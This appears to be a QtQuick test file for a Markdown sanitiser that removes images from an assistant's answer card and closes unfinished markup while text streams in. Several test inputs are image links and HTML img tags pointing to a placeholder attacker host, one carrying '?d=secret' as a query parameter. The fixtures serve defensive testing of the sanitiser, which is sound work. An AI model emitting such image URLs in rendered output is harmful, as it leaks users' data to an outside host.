import QtQuick
import QtTest
import "../../overlay/markdown.js" as Markdown

// The answer card's Markdown keeps its text and loses every image Qt would load.
TestCase {
  name: "Markdown"

  function test_imageless_data() {
    return [
      { tag: "inline image", given: "see ![a chart](https://evil.test/?d=secret) here", expected: "see a chart here" },
      { tag: "image with title", given: "![x](https://evil.test/p.png \"t\")", expected: "x" },
      { tag: "reference image", given: "![x][r]\n\n[r]: https://evil.test/p.png", expected: "x\n\n[r]: https://evil.test/p.png" },
      { tag: "nested brackets", given: "![a [b]](https://evil.test/p.png)", expected: "!\\[a [b]](https://evil.test/p.png)" },
      { tag: "html img", given: "x <img src=\"https://evil.test/p.png\" alt=\"logo\"> y", expected: "x logo y" },
      { tag: "html img without alt", given: "x <IMG SRC='https://evil.test/p.png'/> y", expected: "x  y" },
      { tag: "html img still streaming", given: "x <img src=\"https://evil.te", expected: "x " },
      { tag: "markup kept", given: "**bold** *it* `code` [link](https://ok.test)\n\n- one\n- two", expected: "**bold** *it* `code` [link](https://ok.test)\n\n- one\n- two" },
      { tag: "code kept", given: "`![x](u)` and\n```\n![y](v)\n```", expected: "`![x](u)` and\n```\n![y](v)\n```" },
      { tag: "open fence kept", given: "```\n![y](v)", expected: "```\n![y](v)" },
    ]
  }

  function test_imageless(data) {
    compare(Markdown.imageless(data.given), data.expected)
  }

  function test_closed_data() {
    return [
      { tag: "open fence", given: "```js\nlet a", expected: "```js\nlet a\n```" },
      { tag: "open bold", given: "a **b", expected: "a **b**" },
      { tag: "empty mark", given: "a **", expected: "a" },
      { tag: "complete", given: "a **b** `c`", expected: "a **b** `c`" },
    ]
  }

  function test_closed(data) {
    compare(Markdown.closed(data.given), data.expected)
  }
}
